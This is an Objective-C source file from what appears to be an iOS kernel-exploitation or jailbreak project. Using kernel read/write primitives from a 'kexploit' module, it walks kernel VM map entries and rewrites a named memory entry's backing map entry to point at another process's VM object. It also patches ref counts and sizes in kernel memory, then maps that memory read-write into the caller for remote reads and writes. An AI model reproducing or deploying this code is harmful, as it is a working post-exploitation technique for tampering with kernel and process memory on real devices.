//
//  vm.m
//  Cofi
//
//  Created by seo on 3/29/26.
//

#import <Foundation/Foundation.h>
#import "RemoteCall.h"
#import "vm.h"
#import "../kexploit/krw.h"
#import "../kexploit/offsets.h"
#import "../kexploit/kutils.h"
#import "../kexploit/kexploit_opa334.h"

#define VM_PAGE_PACKED_PTR_BITS                         31
#define VM_PAGE_PACKED_PTR_SHIFT                        6
#define VM_KERNEL_POINTER_SIGNIFICANT_BITS              38
#define PAGE_MASK_K         (PAGE_SIZE - 1ULL)

extern kern_return_t mach_vm_allocate(task_t task, mach_vm_address_t *addr, mach_vm_size_t size, int flags);
extern kern_return_t mach_vm_deallocate(task_t task, mach_vm_address_t addr, mach_vm_size_t size);
extern kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address, mach_vm_size_t size, mach_vm_offset_t mask, int flags, mem_entry_name_port_t object, memory_object_offset_t offset, boolean_t copy, vm_prot_t cur_protection, vm_prot_t max_protection, vm_inherit_t inheritance);

uint64_t vm_map_get_header(uint64_t vm_map_ptr)
{
    return vm_map_ptr + off_vm_map_hdr;
}

uint64_t vm_map_header_get_first_entry(uint64_t vm_header_ptr)
{
    return kread_ptr(vm_header_ptr + off_vm_map_header_links_next);
}

uint64_t vm_map_entry_get_next_entry(uint64_t vm_entry_ptr)
{
    return kread_ptr(vm_entry_ptr + off_vm_map_entry_links_next);
}

uint32_t vm_header_get_nentries(uint64_t vm_header_ptr)
{
    return kread32(vm_header_ptr + off_vm_map_header_nentries);
}

void vm_entry_get_range(uint64_t vm_entry_ptr, uint64_t *start_address_out, uint64_t *end_address_out)
{
    uint64_t range[2];
    kreadbuf(vm_entry_ptr + 0x10, &range[0], sizeof(range));
    if (start_address_out) *start_address_out = range[0];
    if (end_address_out) *end_address_out = range[1];
}

void vm_map_iterate_entries(uint64_t vm_map_ptr, void (^itBlock)(uint64_t start, uint64_t end, uint64_t entry, BOOL *stop))
{
    uint64_t header = vm_map_get_header(vm_map_ptr);
    uint64_t entry = vm_map_header_get_first_entry(header);
    uint64_t numEntries = vm_header_get_nentries(header);

    while (entry != 0 && numEntries > 0) {
        uint64_t start = 0, end = 0;
        vm_entry_get_range(entry, &start, &end);

        BOOL stop = NO;
        itBlock(start, end, entry, &stop);
        if (stop) break;

        entry = vm_map_entry_get_next_entry(entry);
        numEntries--;
    }
}

uint64_t vm_map_find_entry(uint64_t vm_map_ptr, uint64_t address)
{
    __block uint64_t found_entry = 0;
    vm_map_iterate_entries(vm_map_ptr, ^(uint64_t start, uint64_t end, uint64_t entry, BOOL *stop) {
        if (address >= start && address < end) {
            found_entry = entry;
            *stop = YES;
        }
    });
    return found_entry;
}

bool VM_PACKING_IS_BASE_RELATIVE(struct VmPackingParams *p)
{
    return (p->vmpp_bits + p->vmpp_shift) <= VM_KERNEL_POINTER_SIGNIFICANT_BITS;
}

uint64_t vm_unpack_pointer(uint64_t packed, struct VmPackingParams *params)
{
    if (!params->vmpp_base_relative)
    {
        int64_t addr = (int64_t)packed;
        addr <<= (64 - params->vmpp_bits);
        addr >>= (64 - params->vmpp_bits - params->vmpp_shift);
        return (uint64_t)addr;
    }
    if (packed)
    {
        return (packed << params->vmpp_shift) + params->vmpp_base;
    }
    return 0;
}

uint64_t vm_pack_pointer(uint64_t ptr, struct VmPackingParams *params)
{
    if (!params->vmpp_base_relative)
    {
        return ptr >> params->vmpp_shift;
    }
    if (ptr)
    {
        return (ptr - params->vmpp_base) >> params->vmpp_shift;
    }
    return 0;
}

uint64_t VME_OFFSET(uint64_t vme_offset_raw)
{
    return vme_offset_raw << 12;
}

struct VMObject vm_get_object(uint64_t map, uint64_t address)
{
    struct VMObject result = {0};
 
    uint64_t entryAddr = vm_map_find_entry(map, address);
    if (!entryAddr) {
        return result;
    }
 
    struct vm_map_entry entry = {0};
    kreadbuf(entryAddr, &entry, sizeof(struct vm_map_entry));
 
    struct VmPackingParams params = {0};
    params.vmpp_base  = VM_MIN_KERNEL_ADDRESS;
    params.vmpp_bits  = VM_PAGE_PACKED_PTR_BITS;
    params.vmpp_shift = VM_PAGE_PACKED_PTR_SHIFT;
    params.vmpp_base_relative = VM_PACKING_IS_BASE_RELATIVE(&params) ? 1 : 0;
 
    uint32_t vme_object = entry.vme_object_or_delta;
    uint64_t vmeObject = vm_unpack_pointer((uint64_t)vme_object, &params);
    if (!is_kaddr_valid(vmeObject)) {
        return result;
    }
 
    uint64_t vme_offset_raw = entry.vme_offset;
    uint64_t objectOffs = VME_OFFSET(vme_offset_raw);
 
    uint64_t entryOffs = address - entry.links.start + objectOffs;
 
    result.vmAddress    = address;
    result.address      = vmeObject;
    result.objectOffset = objectOffs;
    result.entryOffset  = entryOffs;
 
    return result;
}
 

static struct VMShmem vm_create_shmem_with_object_protection(struct VMObject *object, vm_prot_t requestedProtection)
{
    struct VMShmem shmem = {0};
    if (!object || !is_kaddr_valid(object->address)) {
        printf("[%s:%d] invalid VM object 0x%llx\n",
               __FUNCTION__, __LINE__,
               object ? (unsigned long long)object->address : 0);
        return shmem;
    }
    
    const uint64_t pageSize = vm_page_size ? (uint64_t)vm_page_size : 0x4000ULL;
    const uint64_t pageMask = pageSize - 1ULL;
    const uint64_t alignedOffset = object->entryOffset & ~pageMask;
    const uint64_t subOffset = object->entryOffset & pageMask;
    const uint64_t mapSize = subOffset ? pageSize * 2ULL : pageSize;
    if (alignedOffset > UINT64_MAX - mapSize) return shmem;

    uint64_t size = kread64(object->address + off_vm_object_vo_un1_vou_size);
    uint64_t minSize = mach_vm_round_page(alignedOffset + mapSize);
    uint64_t roundedSize = mach_vm_round_page(size);
    if (minSize == 0 || minSize > 0x40000000ULL) {
        return shmem;
    }
    if (roundedSize < minSize || roundedSize > 0x40000000ULL) {
        roundedSize = minSize;
    }
    if (roundedSize < pageSize) {
        roundedSize = pageSize;
    }
 
    mach_vm_address_t localAddr = 0;
    kern_return_t ret = mach_vm_allocate(mach_task_self(), &localAddr, roundedSize, VM_FLAGS_ANYWHERE);
    if (ret != KERN_SUCCESS) {
        printf("[%s:%d] mach_vm_allocate failed: %s (size=0x%llx)\n", __FUNCTION__, __LINE__, mach_error_string(ret), roundedSize);
        return shmem;
    }
 
    mach_port_t memoryObject = MACH_PORT_NULL;
    memory_object_size_t entrySize = (memory_object_size_t)roundedSize;
    ret = mach_make_memory_entry_64(mach_task_self(), &entrySize, (memory_object_offset_t)localAddr, VM_PROT_READ | VM_PROT_WRITE, &memoryObject, MACH_PORT_NULL);
    if (ret != KERN_SUCCESS) {
        ret = mach_make_memory_entry_64(mach_task_self(), &entrySize, (memory_object_offset_t)localAddr, VM_PROT_DEFAULT, &memoryObject, MACH_PORT_NULL);
    }
    if (ret != KERN_SUCCESS) {
        printf("[%s:%d] mach_make_memory_entry_64 failed: %s (localAddr=0x%llx, roundedSize=0x%llx)\n", __FUNCTION__, __LINE__, mach_error_string(ret), (unsigned long long)localAddr, (unsigned long long)roundedSize);
        mach_vm_deallocate(mach_task_self(), localAddr, roundedSize);
        return shmem;
    }
 
    uint64_t shmemNamedEntry = task_get_ipc_port_kobject(task_self(), memoryObject);
    if (!is_kaddr_valid(shmemNamedEntry)) {
        mach_port_deallocate(mach_task_self(), memoryObject);
        mach_vm_deallocate(mach_task_self(), localAddr, roundedSize);
        return shmem;
    }
    uint64_t shmemVMCopyAddr = kread64(shmemNamedEntry + off_vm_named_entry_backing_copy);
    if (!is_kaddr_valid(shmemVMCopyAddr)) {
        mach_port_deallocate(mach_task_self(), memoryObject);
        mach_vm_deallocate(mach_task_self(), localAddr, roundedSize);
        return shmem;
    }
    uint64_t nextAddr        = kread64(shmemVMCopyAddr + off_vm_named_entry_size);
    if (!is_kaddr_valid(nextAddr)) {
        mach_port_deallocate(mach_task_self(), memoryObject);
        mach_vm_deallocate(mach_task_self(), localAddr, roundedSize);
        return shmem;
    }
 
    struct vm_map_entry entry = {0};
    kreadbuf(nextAddr, &entry, sizeof(struct vm_map_entry));
    
 
    if (entry.vme_kernel_object || entry.is_sub_map) {
        printf("[%s:%d] Entry cannot be a submap or kernel object\n", __FUNCTION__, __LINE__);
        mach_vm_deallocate(mach_task_self(), localAddr, roundedSize);
        mach_port_deallocate(mach_task_self(), memoryObject);
        return shmem;
    }
 
    struct VmPackingParams params = {0};
    params.vmpp_base  = VM_MIN_KERNEL_ADDRESS;
    params.vmpp_bits  = VM_PAGE_PACKED_PTR_BITS;
    params.vmpp_shift = VM_PAGE_PACKED_PTR_SHIFT;
    params.vmpp_base_relative = VM_PACKING_IS_BASE_RELATIVE(&params) ? 1 : 0;
    uint64_t packedPointer = vm_pack_pointer(object->address, &params);
 
    uint32_t refCount = kread32(object->address + off_vm_object_ref_count);
    refCount++;
    kwrite32(object->address + off_vm_object_ref_count, refCount);
    
    entry.vme_object_or_delta = (uint32_t)packedPointer;
    entry.vme_offset = (object->objectOffset >> 12);

    kwrite_zone_element(nextAddr, &entry, sizeof(struct vm_map_entry));

    // Update named_entry size in kernel so mach_vm_map allows offsets beyond initial allocation
    uint64_t requiredNamedSize = alignedOffset + mapSize;
    uint64_t curNamedSize = kread64(shmemNamedEntry + off_vm_named_entry_size);
    if (curNamedSize < requiredNamedSize) {
        kwrite64(shmemNamedEntry + off_vm_named_entry_size, requiredNamedSize);
    }

    mach_vm_address_t mappedAddr = 0;
    vm_prot_t curProt = requestedProtection;
    vm_prot_t maxProt = requestedProtection;

    ret = mach_vm_map(mach_task_self(), &mappedAddr, mapSize, 0,
                       VM_FLAGS_ANYWHERE, memoryObject,
                       (memory_object_offset_t)alignedOffset,
                       FALSE, curProt, maxProt, VM_INHERIT_NONE);
    if (ret != KERN_SUCCESS) {
        static volatile uint64_t mapFailureEvents = 0;
        uint64_t event = __sync_add_and_fetch(&mapFailureEvents, 1);
        if (event == 1 || (event % 128ULL) == 0) {
            printf("[%s:%d] mach_vm_map failed: %s (event=%llu, remote=0x%llx, entryOffset=0x%llx, aligned=0x%llx, namedSize=0x%llx, mapSize=0x%llx)\n",
                   __FUNCTION__, __LINE__, mach_error_string(ret),
                   (unsigned long long)event,
                   (unsigned long long)object->vmAddress,
                   (unsigned long long)object->entryOffset,
                   (unsigned long long)alignedOffset,
                   (unsigned long long)requiredNamedSize,
                   (unsigned long long)mapSize);
        }
        mappedAddr = 0;
    }
 
    ret = mach_vm_deallocate(mach_task_self(), localAddr, roundedSize);
    if (ret != KERN_SUCCESS)
        printf("[%s:%d] mach_vm_deallocate failed: %s\n", __FUNCTION__, __LINE__, mach_error_string(ret));
 
    if (!mappedAddr) {
        mach_port_deallocate(mach_task_self(), memoryObject);
        return shmem;
    }

    shmem.port           = (uint64_t)memoryObject;
    shmem.remoteAddress  = object->vmAddress;
    shmem.localAddress   = (uint64_t)mappedAddr + subOffset;
    shmem.mappingAddress = (uint64_t)mappedAddr;
    shmem.mappingSize    = mapSize;
    shmem.used           = true;
 
    return shmem;
}

struct VMShmem vm_create_shmem_with_object(struct VMObject *object)
{
    // RemoteCall uses the shared mapping for both reads and writes.
    return vm_create_shmem_with_object_protection(object, VM_PROT_READ | VM_PROT_WRITE);
}

struct VMShmem vm_map_remote_page(uint64_t vmMap, uint64_t address)
{
    struct VMShmem shmem = {0};
    struct VMObject vmObject = vm_get_object(vmMap, address);
    if (!vmObject.address)
    {
        return shmem;
    }
 
    return vm_create_shmem_with_object(&vmObject);
}

struct VMShmem vm_map_remote_page_readonly(uint64_t vmMap, uint64_t address)
{
    struct VMShmem shmem = {0};
    struct VMObject vmObject = vm_get_object(vmMap, address);
    if (!vmObject.address) return shmem;
    return vm_create_shmem_with_object_protection(&vmObject, VM_PROT_READ);
}
